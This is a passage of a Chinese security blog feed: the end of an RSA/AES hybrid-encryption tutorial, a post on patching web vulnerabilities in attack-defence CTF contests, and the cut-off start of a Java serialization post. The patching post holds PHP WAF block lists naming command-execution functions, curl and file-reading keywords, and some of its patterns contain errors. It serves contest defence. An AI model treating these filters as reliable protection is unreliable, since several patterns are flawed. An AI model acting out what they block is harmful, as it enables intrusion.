aes_decrypt(cipher_text, aes_key, aes_iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分离出原文和签名</span></span><br><span class="line">    sig_len = <span class="built_in">len</span>(signature)</span><br><span class="line">    recovered_msg = decrypted_data[:-sig_len]</span><br><span class="line">    recovered_signature = decrypted_data[-sig_len:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证签名</span></span><br><span class="line">    recovered_hash = sha256_hash(recovered_msg.decode())</span><br><span class="line">    valid = rsa_verify(public_key, recovered_hash, recovered_signature)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密文：&quot;</span>, cipher_text)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;消息是否被篡改：&quot;</span>, <span class="keyword">not</span> valid)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;还原后的消息：&quot;</span>, recovered_msg.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面我从整体流程到代码细节，分三部分给你讲解——即便你是密码小白，也能跟着思路一步步弄懂：</p><hr><h2 id="一、整体加密＋签名流程概述"><a href="#一、整体加密＋签名流程概述" class="headerlink" title="一、整体加密＋签名流程概述"></a>一、整体加密＋签名流程概述</h2><p>本实验演示的是一种“<strong>带保密性（Confidentiality）＋带签名（Authenticity）</strong>”的混合加密方案，大致分三步：</p><ol><li><p><strong>数字签名（Authentication）</strong>  </p><ul><li>对明文 <code>M</code> 先做 <strong>哈希</strong>（SHA‑256），得到消息摘要 <code>H = SHA256(M)</code>  </li><li>用<strong>发送方的 RSA 私钥</strong>对 <code>H</code> 进行 <strong>PKCS#1 v1.5 签名</strong>，得到签名 <code>S</code>  </li></ul></li><li><p><strong>对称加密（Confidentiality）</strong>  </p><ul><li>生成一次性随机 <strong>AES 密钥</strong> <code>K</code> 和初始向量 <code>IV</code>  </li><li>用 <strong>AES-CBC</strong> 模式对原文 <code>M</code> 进行加密，得到密文 <code>C = AES_CBC_Enc(K, IV, M)</code>  </li></ul></li><li><p><strong>密钥封装（Key Encapsulation）</strong>  </p><ul><li>（可选／示例中未实现）用<strong>接收方 RSA 公钥</strong>将对称密钥 <code>K</code> 加密，得到 <code>E = RSA_Encrypt(Pub_recipient, K)</code>  </li><li>最后将三部分打包发送给接收方：<code>&#123; E, IV, C, S &#125;</code>  </li></ul></li></ol><p>接收方收到后，按反向步骤依次：  </p><ol><li>RSA 解密拿到对称密钥 <code>K</code>  </li><li>用 <code>K, IV</code> 解 AES，得到明文 <code>M′</code>  </li><li>对 <code>M′</code> 再做 SHA‑256，得到 <code>H′</code>，用发送方公钥验证 <code>H′</code> 是否匹配签名 <code>S</code>  </li></ol><p>这样既保证了内容的<strong>保密性</strong>，又保证了发送者身份的<strong>不可否认性</strong>和<strong>完整性</strong>。</p><hr><h2 id="二、代码流程详解"><a href="#二、代码流程详解" class="headerlink" title="二、代码流程详解"></a>二、代码流程详解</h2><p>你给出的代码示例，主要实现了上面第 1、2 步（签名 + 对称加密 + 解密 + 验签），我们分块看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> pkcs1_15</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br></pre></td></tr></table></figure><ul><li>引入了 PyCryptodome 库的 <strong>RSA</strong>, <strong>AES</strong>, <strong>SHA256</strong>, <strong>PKCS#1 v1.5 签名</strong> 以及 <strong>随机数、填充</strong> 工具。</li></ul><hr><h3 id="1-哈希函数"><a href="#1-哈希函数" class="headerlink" title="1. 哈希函数"></a>1. 哈希函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sha256_hash</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> SHA256.new(data.encode())</span><br></pre></td></tr></table></figure><ul><li><strong>功能</strong>：对字符串 <code>data</code> 做 SHA‑256，返回一个 <code>Hash</code> 对象，供签名或验证使用。</li></ul><hr><h3 id="2-RSA-签名／验签"><a href="#2-RSA-签名／验签" class="headerlink" title="2. RSA 签名／验签"></a>2. RSA 签名／验签</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_sign</span>(<span class="params">private_key, hash_obj</span>):</span><br><span class="line">    <span class="keyword">return</span> pkcs1_15.new(private_key).sign(hash_obj)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_verify</span>(<span class="params">public_key, hash_obj, signature</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pkcs1_15.new(public_key).verify(hash_obj, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><ul><li><strong>签名</strong>：用私钥对 <code>hash_obj</code> 进行 PKCS#1 v1.5 签名，返回原始字节串 <code>signature</code>。  </li><li><strong>验签</strong>：用公钥验证签名，若匹配则返回 <code>True</code>，否则抛异常并返回 <code>False</code>。</li></ul><hr><h3 id="3-AES-CBC-加解密"><a href="#3-AES-CBC-加解密" class="headerlink" title="3. AES-CBC 加解密"></a>3. AES-CBC 加解密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(pad(plaintext, AES.block_size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">ciphertext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> unpad(cipher.decrypt(ciphertext), AES.block_size)</span><br></pre></td></tr></table></figure><ul><li><strong>加密</strong>：  <ol><li>用 <code>key, iv</code> 构造 AES-CBC 对象  </li><li>对明文 <code>plaintext</code> 先做 PKCS#7 填充（块长 16 字节），再加密  </li></ol></li><li><strong>解密</strong>：反向解密并去除填充</li></ul><hr><h3 id="4-主流程"><a href="#4-主流程" class="headerlink" title="4. 主流程"></a>4. 主流程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 1）准备原文</span></span><br><span class="line">    plain_text = <span class="string">&quot;Hey&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2）哈希 + 签名</span></span><br><span class="line">    msg_hash  = sha256_hash(plain_text)</span><br><span class="line">    rsa_key   = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    private_key = rsa_key</span><br><span class="line">    public_key  = rsa_key.publickey()</span><br><span class="line">    signature = rsa_sign(private_key, msg_hash)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3）把原文和签名拼在一起，统一做对称加密</span></span><br><span class="line">    combined_data = plain_text.encode() + signature</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4）生成随机 AES 密钥 &amp; IV</span></span><br><span class="line">    aes_key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># 128 位</span></span><br><span class="line">    aes_iv  = get_random_bytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5）AES 加密</span></span><br><span class="line">    cipher_text = aes_encrypt(combined_data, aes_key, aes_iv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ——网络传输或存储——</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6）AES 解密</span></span><br><span class="line">    decrypted_data = aes_decrypt(cipher_text, aes_key, aes_iv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 7）分离出原文和签名</span></span><br><span class="line">    sig_len = <span class="built_in">len</span>(signature)</span><br><span class="line">    recovered_msg       = decrypted_data[:-sig_len]</span><br><span class="line">    recovered_signature = decrypted_data[-sig_len:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 8）验签</span></span><br><span class="line">    recovered_hash = sha256_hash(recovered_msg.decode())</span><br><span class="line">    valid = rsa_verify(public_key, recovered_hash, recovered_signature)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 9）输出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密文：&quot;</span>, cipher_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;消息是否被篡改：&quot;</span>, <span class="keyword">not</span> valid)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;还原后的消息：&quot;</span>, recovered_msg.decode())</span><br></pre></td></tr></table></figure><ol><li><strong>生成 RSA 密钥对</strong>  </li><li><strong>签名</strong>：对 <code>&quot;Hey&quot;</code> 的 SHA‑256 做签名  </li><li><strong>拼接</strong>：为了简化，把签名字节直接追加到明文后面  </li><li><strong>AES-CBC 加密</strong>：对拼接后的数据加密  </li><li><strong>AES-CBC 解密</strong>  </li><li><strong>分离</strong>出明文和签名，再次做 SHA‑256，验签  </li></ol><blockquote><p><strong>注意</strong>：代码中并没有把 <code>aes_key</code> 用 RSA 公钥加密；在真实场景下，应当将 <code>aes_key</code> 也封装进消息里，保证对称密钥的机密性。  </p></blockquote><hr><h2 id="三、完整示例：加上“密钥封装”的改进"><a href="#三、完整示例：加上“密钥封装”的改进" class="headerlink" title="三、完整示例：加上“密钥封装”的改进"></a>三、完整示例：加上“密钥封装”的改进</h2><p>下面给出一个更完整的示例，加入“用接收方 RSA 公钥加密 AES 密钥”这一步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> pkcs1_15</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"></span><br><span class="line"><span class="comment"># …（前面 sha256_hash, rsa_sign, rsa_verify, aes_encrypt, aes_decrypt 一样）…</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 原文</span></span><br><span class="line">    M = <span class="string">&quot;Hello, world!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 签名</span></span><br><span class="line">    H = sha256_hash(M)</span><br><span class="line">    sender_rsa = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    S = rsa_sign(sender_rsa, H)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 对称加密原文</span></span><br><span class="line">    aes_key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">    iv      = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">    C = aes_encrypt(M.encode(), aes_key, iv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. RSA 封装 AES 密钥</span></span><br><span class="line">    recipient_rsa = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    cipher_rsa = PKCS1_OAEP.new(recipient_rsa.publickey())</span><br><span class="line">    E = cipher_rsa.encrypt(aes_key)  <span class="comment"># RSA-OAEP 加密</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打包发送：&#123; E, iv, C, S &#125;</span></span><br><span class="line">    package = &#123;</span><br><span class="line">        <span class="string">&#x27;E&#x27;</span>: E,</span><br><span class="line">        <span class="string">&#x27;iv&#x27;</span>: iv,</span><br><span class="line">        <span class="string">&#x27;C&#x27;</span>: C,</span><br><span class="line">        <span class="string">&#x27;S&#x27;</span>: S,</span><br><span class="line">        <span class="string">&#x27;pub_sender&#x27;</span>: sender_rsa.publickey()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ——接收方——</span></span><br><span class="line">    <span class="comment"># 4. 解 RSA 封装的 AES 密钥</span></span><br><span class="line">    rsa_dec = PKCS1_OAEP.new(recipient_rsa)</span><br><span class="line">    aes_key_recv = rsa_dec.decrypt(package[<span class="string">&#x27;E&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. 解 AES</span></span><br><span class="line">    M_rec = aes_decrypt(package[<span class="string">&#x27;C&#x27;</span>], aes_key_recv, package[<span class="string">&#x27;iv&#x27;</span>]).decode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6. 验签</span></span><br><span class="line">    H_rec = sha256_hash(M_rec)</span><br><span class="line">    ok = rsa_verify(package[<span class="string">&#x27;pub_sender&#x27;</span>], H_rec, package[<span class="string">&#x27;S&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;明文恢复：&quot;</span>, M_rec)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;签名验证通过？&quot;</span>, ok)</span><br></pre></td></tr></table></figure><p>这样就完成了：</p><ol><li><strong>签名</strong>（防篡改+身份认证）  </li><li><strong>对称加密</strong>（高效保密）  </li><li><strong>密钥封装</strong>（保证对称密钥的机密性）  </li></ol><hr><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li><strong>SHA‑256</strong> 负责生成消息摘要。  </li><li><strong>RSA 私钥签名 + 公钥验签</strong> 保证消息未被篡改且确实来自发送方。  </li><li><strong>AES-CBC</strong> 高效地加密大段数据。  </li><li><strong>RSA-OAEP</strong>（或 PKCS#1 v1.5）封装对称密钥，既保密又兼容公钥基础设施。  </li></ul><p>这套混合加密＋签名方案，正是很多安全协议（如 TLS）在应用层面使用的基本思路。希望这个分步详解，能让你对每一步的“<strong>为什么要这样做</strong>”和“<strong>代码如何实现</strong>”都清晰明了！如果还有任何疑问，随时提～</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;仿射密码&quot;&gt;&lt;a href=&quot;#仿射密码&quot; class=&quot;headerlink&quot; title=&quot;仿射密码&quot;&gt;&lt;/a&gt;仿射密码&lt;/h1&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>awdp</title>
    <link href="https://lisien11.xyz/2025/04/11/awdp/"/>
    <id>https://lisien11.xyz/2025/04/11/awdp/</id>
    <published>2025-04-11T01:13:34.000Z</published>
    <updated>2025-04-17T13:09:46.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>什么是awdp？<br>AWDP是一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式。每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。</p><p>说白了awdp其实就是ctf+漏洞修复罢了。</p><p>修复其实就是加waf，预处理，让主办方的payload无法打通修复后的web系统</p><p>正常修会比打简单，而且因为awdp是按轮数吃分的，修的越早能吃的分越多，所以一般都先修后打。</p><h1 id="常见FIX手段"><a href="#常见FIX手段" class="headerlink" title="常见FIX手段"></a>常见FIX手段</h1><p>SQL注入:加waf，过滤引号等，php就使用预处理，java若为mybatis就将<code>$&#123;&#125;</code>改为<code>#&#123;&#125;</code></p><p>rce :找到rce的点对命令执行的函数人eval，system引号反引号等进行过滤，也可以尝试对这个rce的点进行删除</p><p>php反序列化:找到链尾对其进行过滤，在反序列化前进行过滤。在链首部如<code>__wakeup</code>来判断其每个属性是否为类的实例，如果是就exit()</p><p>ssrf:一般ssrf都是有伴随着一个强制本地ip的命令执行路由或者文件读取路由，或者就是使用file://这种协议来文件读取，所以在写waf时需要限制协议过滤file|gopher|dict|sftp|ldap,</p><p>SSTI:看框架如flask可以对<code>&#123;</code>进行过滤，如果其他框架如bottle对<code>&#123;</code>，<code>%</code>进行过滤，建议在写waf时顺便多加一点如system，popen，flag等</p><p>文件上传:强制后缀判定，文件内容判断</p><p>原型链污染：直接注释即可</p><p>java反序列化:修改输入流类</p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>sql注入最常规的修复方法就是加waf</p><p>php的直接使用addslashes来处理即可</p><p>目前再ctf中java中出现sql注入一般有两种1.利用自带的jdbc编写导致的sql注入,利用mybatis来编写时造成的sql注入</p><p>将直接拼接的sql语句改为预处理语句即可</p><p>mybatis的sql注入相对会好修一些就是漏洞点会比较难找</p><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h1 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h1><p>修复java反序列化的时候可以先尝试上通防,如果通防没防住就需要找一下出题人有没有重写或者自己写了恶意类</p><p>192.168.255.224</p><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h1 id="常用waf"><a href="#常用waf" class="headerlink" title="常用waf"></a>常用waf</h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>全局waf<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str1</span> =<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$str1</span>.=<span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$str1</span>.=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str2</span> =<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$str2</span>.=<span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$str2</span>.=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|tail|flag|\&#x27;|\&quot;|\&lt;|\&#123;|\&#125;|exec|base64|phpinfo|&lt;\?|\&quot;/i&quot;</span>, <span class="variable">$str1</span>)||<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|tail|flag|\&#x27;|\&quot;|\&lt;|\&#123;|\&#125;|exec|base64|phpinfo|&lt;\?|\&quot;/i&quot;</span>, <span class="variable">$str2</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RCE</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wafrce</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//SQL</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wafsqli</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#x27;|\^|\|/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|flag|union|\\\\$|\&#x27;|\&quot;|--|#|\\0|into|alert|img|prompt|set|/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|/is&quot;</span>,<span class="variable">$s</span>)||<span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>)&gt;<span class="number">50</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//XSS</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wafxss</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AWDP&quot;&gt;&lt;a href=&quot;#AWDP&quot; class=&quot;headerlink&quot; title=&quot;AWDP&quot;&gt;&lt;/a&gt;AWDP&lt;/h1&gt;&lt;p&gt;什么是awdp？&lt;br&gt;AWDP是一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式。每个参赛队互为攻击方和</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>java反序列常用方法(持续更新)</title>
    <link href="https://lisien11.xyz/2025/04/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>https://lisien11.xyz/2025/04/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</id>
    <published>2025-04-10T14:05:01.000Z</published>
    <updated>2025-04-25T12:31:27.484Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序列化反序列化"><a href="#序列化反序列化" class="headerlink" title="序列化反序列化"></a>序列化反序列化</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span 